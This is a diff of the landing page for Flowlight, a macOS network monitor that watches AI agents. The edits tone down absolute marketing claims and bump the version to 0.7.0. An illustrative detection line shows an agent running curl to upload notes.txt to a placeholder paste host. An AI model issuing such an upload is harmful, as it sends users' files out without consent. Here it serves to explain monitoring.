@@ -4,12 +4,14 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>Flowlight for macOS</title>
-<meta name="description" content="Flowlight is a free, open-source macOS network monitor. See every app&#x27;s traffic to every domain, and watch AI agents for data leaving your Mac.">
+<meta name="description" content="Flowlight is a free, open-source macOS network monitor for investigating application traffic and AI agent activity.">
 <link rel="canonical" href="https://flowlight.xinbetween.com/">
 <meta property="og:title" content="Flowlight for macOS">
-<meta property="og:description" content="Flowlight is a free, open-source macOS network monitor. See every app&#x27;s traffic to every domain, and watch AI agents for data leaving your Mac.">
+<meta property="og:description" content="Flowlight is a free, open-source macOS network monitor for investigating application traffic and AI agent activity.">
 <meta property="og:url" content="https://flowlight.xinbetween.com/">
-<meta property="og:image" content="https://flowlight.xinbetween.com/assets/screenshots/agents.png">
+<meta property="og:image" content="https://flowlight.xinbetween.com/assets/social-card.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
 <meta name="twitter:card" content="summary_large_image">
 <link rel="icon" href="assets/icon.png">
 <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -38,10 +40,10 @@
     <div class="wrap">
       <div>
         <p class="eyebrow">Free · open source · macOS 15+</p>
-        <h1 style="margin-top:16px">Every app. Every domain. <span class="flow">Every agent.</span></h1>
-        <p class="lede">Flowlight shows which app on your Mac talked to which domain, over which protocol, and how much it sent.
-          It keeps a closer eye on AI agents, so an email, an SSH session or a 180&nbsp;MB upload you never asked for
-          doesn't go unnoticed. Turn on HTTPS inspection and you see the tool calls behind it, too.</p>
+        <h1 style="margin-top:16px">Know which apps connect. <span class="flow">Understand where data goes.</span></h1>
+        <p class="lede">Flowlight records observed network activity by application, destination and protocol, with byte counts and historical analysis.
+          It highlights unusual AI agent activity, including sensitive protocols and large uploads. Optional HTTPS inspection can show
+          request details and model tool calls for applications explicitly routed through Flowlight.</p>
         <div class="cta">
           <a class="btn btn-primary" href="https://github.com/xinbetween/flowlight/releases/latest/download/Flowlight.dmg">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 4v11m0 0-4.5-4.5M12 15l4.5-4.5M5 20h14"/></svg>
@@ -52,7 +54,7 @@
             Star on GitHub
           </a>
           <p class="brew"><code>brew install --cask xinbetween/tap/flowlight</code><button type="button" class="copy" data-copy="brew install --cask xinbetween/tap/flowlight">Copy</button></p>
-          <p class="meta-row"><span>v0.6.8</span><span>macOS 15+</span><span>Universal</span><span>GPL-3.0</span><span>No telemetry</span></p>
+          <p class="meta-row"><span>v0.7.0</span><span>macOS 15+</span><span>Universal</span><span>GPL-3.0</span><span>No telemetry</span></p>
         </div>
       </div>
 
@@ -142,19 +144,18 @@
     <div class="wrap">
       <div class="section-head">
         <p class="eyebrow">Capture</p>
-        <h2>The two questions Activity Monitor can't answer</h2>
-        <p class="lede">Which app sent it? Where did it go? Flowlight ties every TCP and UDP flow to its app and its real
-          hostname, with bytes in and out, stored locally so you can look back an hour or a year.</p>
+        <h2>Application-aware network visibility</h2>
+        <p class="lede">Flowlight attributes observed TCP and UDP activity to applications and records destinations, protocols,
+          and byte counts locally. Coverage depends on the selected capture source and available hostname information.</p>
       </div>
       <div class="pair">
         <div class="fact">
-          <span class="figure">Every app</span>
-          <p>Apps, command-line tools and background daemons, attributed by process. Your agents' helper scripts included.</p>
+          <span class="figure">Per application</span>
+          <p>Applications, command-line tools and background services attributed by process, including recognized agent child processes.</p>
         </div>
         <div class="fact">
-          <span class="figure">Real hostnames</span>
-          <p>Taken from TLS server names and DNS answers seen on the wire, so you see <code>api.openai.com</code>, not
-            <code>104.18.7.192</code>. Traffic with no name can show who owns the address.</p>
+          <span class="figure">Resolved hostnames</span>
+          <p>Learned from observed TLS server names and DNS responses. When no hostname is available, Flowlight can optionally identify the network owner.</p>
         </div>
         <div class="fact">
           <span class="figure">1 s <small>→ 1 year</small></span>
@@ -168,10 +169,9 @@
     <div class="wrap agents">
       <div class="section-head" style="margin:0">
         <p class="eyebrow">AI Agent Watch</p>
-        <h2>Your agents have network access. Now you have oversight.</h2>
-        <p class="lede">Flowlight knows 16 agents by name. It also spots any other process that calls one of
-          27 LLM API providers, so a Python script talking to <code>api.openai.com</code> is an agent too.
-          Browsers don't count: a person chatting isn't an agent.</p>
+        <h2>Monitor how AI agents use the network</h2>
+        <p class="lede">Flowlight recognizes 16 agents by name and classifies other processes that contact one of
+          27 known LLM API providers. Browser traffic is excluded from automatic agent classification.</p>
         <div class="agent-list" aria-label="Recognized agents">
           <span class="chip">Claude Code</span><span class="chip">Codex</span><span class="chip">Cursor</span>
           <span class="chip">Windsurf</span><span class="chip">GitHub Copilot</span><span class="chip">Gemini CLI</span>
@@ -215,7 +215,7 @@
         <div class="rule">
           <span class="sev info">⌕ Opt-in</span>
           <div><h3>Tool calls, from the model's own responses</h3>
-            <p>Turn on HTTPS inspection and Flowlight reads every tool an agent offers the model, every call the model asks for and the result that came back, then ties each tool's request back to the call that caused it.</p>
+            <p>For supported providers and applications routed through HTTPS inspection, Flowlight can record declared tools, model-requested tool calls and returned results, then correlate a tool's network requests with the originating call.</p>
             <p class="example">curl → paste.example:443 &nbsp;←&nbsp; Bash: curl -s https://paste.example/up -d @notes.txt</p></div>
         </div>
         <div class="rule">
@@ -292,8 +292,8 @@
         <div class="family"><header><h3>Push &amp; developer</h3><span class="count">6</span></header>
           <div class="protos"><span>APNs</span><span>FCM</span><span>Docker</span><span>Kubernetes</span><span>Ollama</span></div></div>
       </div>
-      <p class="footnote">Flowlight observes every TCP and UDP flow, which covers essentially all app traffic. ICMP (ping) and
-        other raw-IP protocols aren't attributed, and encrypted payloads are never decrypted unless you turn on HTTPS inspection.</p>
+      <p class="footnote">With the Network Extension enabled, Flowlight observes eligible TCP and UDP flows. ICMP, other raw-IP
+        protocols and some system traffic are outside this coverage. Encrypted payloads remain encrypted unless an application is explicitly routed through HTTPS inspection.</p>
     </div>
   </section>
 
@@ -344,9 +344,9 @@
     <div class="wrap">
       <div class="section-head">
         <p class="eyebrow">HTTPS inspection · optional</p>
-        <h2>See the tool call behind every request</h2>
+        <h2>Correlate supported tool calls with network requests</h2>
         <p class="lede">Off by default. Turn it on and Flowlight becomes a local proxy with its own certificate authority, created on your
-          Mac. Start an agent from an inspected Terminal and every request it and its tools make is decrypted, with the tool calls the
+          Mac. Start an agent from an inspected Terminal and supported HTTP traffic from the agent and its tools is decrypted, with tool calls the
           model asked for and the results that went back.</p>
       </div>
       <figure class="detail-shot"><div class="frame"><img src="assets/screenshots/inspect.png?v=a17c1494" width="1600" height="1075" loading="lazy"
@@ -367,7 +367,7 @@
         <div><strong>Tool calls and results</strong><p>Anthropic, OpenAI, Gemini and MCP. Each call with its command, its output or error, and the requests its tool made.</p></div>
         <div><strong>Models and tokens</strong><p>Which model answered, how many calls, and tokens in, out and served from cache, per agent.</p></div>
         <div><strong>Readable bodies</strong><p>JSON as a collapsible tree in its original order, streams one event at a time, headers and raw view.</p></div>
-        <div><strong>On your terms</strong><p>AI agents only by default. Apple services and password managers are never decrypted, credentials never stored, and one button removes it all.</p></div>
+        <div><strong>Explicitly controlled</strong><p>Inspection targets AI agents by default. Flowlight excludes its built-in list of Apple services and password managers, redacts credential headers before storage, and provides one action to remove the certificate and recorded data.</p></div>
       </div>
     </div>
   </section>
@@ -427,7 +427,7 @@
         <p class="eyebrow">Install</p>
         <h2>Running in under a minute</h2>
         <ol class="steps" style="margin-top:16px">
-          <li><div><strong>Download Flowlight.dmg</strong><p>Open it and drag Flowlight into Applications. A <a href="https://github.com/xinbetween/flowlight/releases/latest">.pkg installer</a> is also on every release. Releases are signed and notarized, so macOS opens it without complaint.</p></div></li>
+          <li><div><strong>Download Flowlight.dmg</strong><p>Open it and drag Flowlight into Applications. A <a href="https://github.com/xinbetween/flowlight/releases/latest">.pkg installer</a> is also available with each release. Releases are signed with a Developer ID certificate and notarized by Apple.</p></div></li>
           <li><div><strong>Launch it</strong><p>Traffic appears within a second, and live ↓↑ rates sit in your menu bar.</p></div></li>
           <li><div><strong>Name your traffic</strong><p>Approve the one-time setup (your password, once) so Flowlight can read hostnames.</p></div></li>
         </ol>
@@ -459,7 +459,7 @@ open Flowlight.app --args -FLDemo YES</pre>
             that map names to addresses, and contents stay encrypted. If you want the full picture, <strong>HTTPS inspection</strong> is a
             separate, opt-in mode: Flowlight becomes a local proxy with its own certificate authority and decrypts the apps you route
             through it (AI agents only, by default), including every tool call a model asks an agent to run. Apps that pin their
-            certificates still refuse it, and Apple services and password managers are never decrypted.</p></details>
+            certificates may reject it. Flowlight excludes its built-in list of Apple services and password managers from inspection.</p></details>
         <details><summary>How is this different from Little Snitch or LuLu?</summary>
           <p>Those are firewalls that ask you to allow connections. Flowlight is an analytics tool: history at any zoom,
             anomaly baselines, and rules built for AI agents. They work well side by side.</p></details>
@@ -472,8 +472,7 @@ open Flowlight.app --args -FLDemo YES</pre>
             Desktop, Cursor, Windsurf, VS Code, Codex, Zed and Gemini CLI configs. It can't see which individual tool call inside a
             long-running server opened a connection.</p></details>
         <details><summary>Does an allowlist block traffic?</summary>
-          <p>Not yet. A violation raises a critical alert and marks the destination "Not allowed". Blocking needs the Network
-            Extension engine and is on the roadmap.</p></details>
+          <p>An allowlist reports violations by default. When the Network Extension is active, you can enable enforcement for an agent so unlisted destinations are refused. The nettop sampler can report violations but cannot block connections.</p></details>
         <details><summary>Which agents does it recognize?</summary>
           <p>Claude Code, Codex, Cursor, Windsurf, GitHub Copilot, Gemini CLI, Aider, Goose, OpenCode, Ollama, LM Studio,
             ChatGPT, Claude, Zed, Perplexity and ZCode, plus any non-browser process that calls a known LLM API. Adding one is a
@@ -566,7 +565,7 @@ open Flowlight.app --args -FLDemo YES</pre>
     <div class="footer-grid">
       <div class="footer-brand">
         <a class="brand" href=""><img src="assets/icon.png" alt="">Flowlight</a>
-        <p>See every connection your Mac makes, and every move your AI agents make.</p>
+        <p>Application-aware network monitoring for macOS, with focused visibility into AI agents.</p>
       </div>
       <div><h4>Product</h4><ul>
         <li><a href="https://github.com/xinbetween/flowlight/releases/latest/download/Flowlight.dmg">Download for macOS</a></li>
@@ -593,7 +592,7 @@ open Flowlight.app --args -FLDemo YES</pre>
     <div class="legal">
       <span>© 2026 The Flowlight contributors. Flowlight is free software, released under the
         <a href="https://github.com/xinbetween/flowlight/blob/main/LICENSE">GNU General Public License v3.0</a>.</span>
-      <span>Version 0.6.8 · Not affiliated with Apple or any AI provider named on this site.</span>
+      <span>Version 0.7.0 · Not affiliated with Apple or any AI provider named on this site.</span>
     </div>
   </div>
 </footer>
